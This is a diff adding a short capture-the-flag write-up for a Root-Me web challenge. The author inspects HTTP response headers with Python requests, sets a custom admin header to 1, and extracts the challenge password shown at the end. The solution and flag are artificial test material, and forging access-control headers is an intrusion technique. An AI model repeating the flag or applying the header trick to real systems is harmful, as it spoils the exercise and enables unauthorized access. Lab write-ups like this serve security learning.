@@ -1,0 +1,26 @@
+WebServer Challenge 5 - HTTP Headers
+
+Synopsis: Content is not the only part of an HTTP Response
+
+By sending a request and viewing the response headers we notice:
+>>> r = requests.get('http://challenge01.root-me.org/web-serveur/ch5/')
+
+>>> for k,v in r.headers.items():
+...  print k,v
+... 
+Server nginx
+Date Sun, 17 Jun 2018 23:17:41 GMT
+Content-Type text/html; charset=UTF-8
+Transfer-Encoding chunked
+Connection keep-alive
+Vary Accept-Encoding
+Header-RootMe-Admin none
+Content-Encoding gzip
+
+
+So by setting a value of 1 to Header-RootMe-Admin:
+
+>>> r = requests.get('http://challenge01.root-me.org/web-serveur/ch5/', headers={'Header-RootMe-Admin':'1'})
+
+>>> re.findall('password \w*',r.content)
+['password HeadersMayBeUseful']
